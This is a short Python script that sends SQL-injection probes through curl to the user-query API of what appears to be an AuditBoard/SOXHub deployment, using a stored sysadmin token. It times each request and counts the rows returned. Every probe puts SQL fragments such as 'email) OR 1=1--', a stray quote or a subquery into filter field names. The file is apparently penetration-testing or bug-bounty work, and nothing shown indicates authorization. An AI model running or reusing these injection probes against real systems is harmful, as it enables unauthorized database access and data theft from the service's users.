import json,subprocess,os,time
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
def post(body):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X','POST',
         H+'/api/v1/table/query?entities=user',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-AuditBoard-Source: SchemaTable Rows','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== nested relationship filters — SQLi via path traversal in field name ===")
probes=[
 ("nested-dot", {"user.email":{"$eq":"0707@soxhub.com"}}),
 ("nested-rel", {"user":{"email":{"$eq":"0707@soxhub.com"}}}),
 ("sql-in-field", {"email) OR 1=1--":{"$eq":"x"}}),
 ("sql-in-field2", {"email'":{"$eq":"x"}}),
 ("field-subquery", {"(SELECT 1)":{"$eq":"x"}}),
 ("field-json", {"email->>'x'":{"$eq":"x"}}),
 ("field-cast", {"email::text":{"$eq":"x"}}),
]
for label,f in probes:
    t0=time.time()
    c,b=post({"ab:query":{"entities":["user"],"filter":f,"include":["user"]}})
    dt=round(time.time()-t0,2)
    n=0
    try: n=len(json.loads(b).get('included') or [])
    except: pass
    print(f"  {label:16} {c:>4} rows={n:<4} t={dt}s  {b[:95].replace(chr(10),' ')}")
